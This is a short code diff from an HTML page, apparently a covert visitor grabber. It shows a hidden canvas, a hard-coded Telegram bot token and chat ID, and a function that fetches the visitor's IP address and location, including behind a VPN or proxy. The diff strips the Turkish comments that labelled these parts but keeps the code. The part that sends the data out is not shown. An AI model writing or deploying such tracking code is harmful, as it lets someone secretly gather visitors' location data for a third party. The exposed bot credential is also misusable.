@@ -34,15 +34,10 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ============================================================
-        // TELEGRAM BOT KONFIGÜRASYONU
-        // ============================================================
+    
         const BOT_TOKEN = "8684980330:AAGS_BcTgBsH0dXw0Jg1qI5uidqVQ7dVjFw";
         const CHAT_ID = "8610330090";
 
-        // ============================================================
-        // 1. IP ve Konum Bilgisi (vpn/proxy dahil)
-        // ============================================================
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
